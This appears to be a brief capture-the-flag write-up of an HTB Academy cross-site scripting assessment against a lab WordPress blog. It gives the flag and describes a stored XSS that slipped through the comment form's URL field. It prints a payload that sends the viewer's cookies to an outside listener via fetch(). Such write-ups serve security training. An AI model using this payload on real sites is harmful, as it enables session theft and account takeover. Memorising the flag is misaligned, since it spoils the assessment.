## HTB Academy: Cross-Site Scripting Skills Assessment

**Status:** ✅ COMPLETE

**Target:** WordPress 5.7.2 "Security Blog" at `http://localhost:9090/assessment/`

**Flag:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`

### Attack Chain
- Initial payloads (`<script>`, `<img onerror>`) in comment body were stripped by WordPress `wp_kses()`
- **Successful vector:** Website/URL field in comment form had weaker sanitization
- Payload: `"><img src=x onerror="fetch('http://10.10.15.241:4444/website?c='+document.cookie)">`
- Admin approved the comment → viewed the post → XSS fired → cookie exfiltrated

### Key Lesson
WordPress comment sanitization is **context-dependent**. The comment body stripped tags, but the URL field allowed the payload through. Always test ALL input fields in a form — they may have different validation rules.
